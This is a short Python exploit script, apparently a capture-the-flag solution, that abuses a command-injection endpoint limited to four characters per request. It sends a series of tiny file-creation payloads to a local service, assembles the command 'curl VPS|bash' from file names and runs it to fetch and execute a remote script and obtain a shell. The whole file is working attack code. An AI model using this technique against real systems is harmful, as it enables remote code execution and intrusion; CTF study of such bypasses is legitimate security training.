import requests
from time import sleep
from urllib import quote

payload = [
    # generate "g> ht- sl" to file "v"
    '>dir',
    '>sl',
    '>g\>',
    '>ht-',
    '*>v',

    # reverse file "v" to file "x", content "ls -th >g"
    '>rev',
    '*v>x',

    # generate `curl VPS|bash`
    # * 为隐去的 VPS ip 地址十进制的某位
    '>\;\\',
    '>sh\\',
    '>ba\\',
    '>\|\\',
    '>2\\',
    '>1*\\',
    '>8*\\',
    '>5*\\',
    '>7*\\',
    '>\ \\',
    '>rl\\',
    '>cu\\',

    # got shell
    'sh x',
    'sh g',
]


r = requests.get('http://127.0.0.1:8009/?reset=1')
for i in payload:
    assert len(i) <= 4
    r = requests.get('http://127.0.0.1:8009/?cmd=' + quote(i))
    print(i)
    sleep(0.1)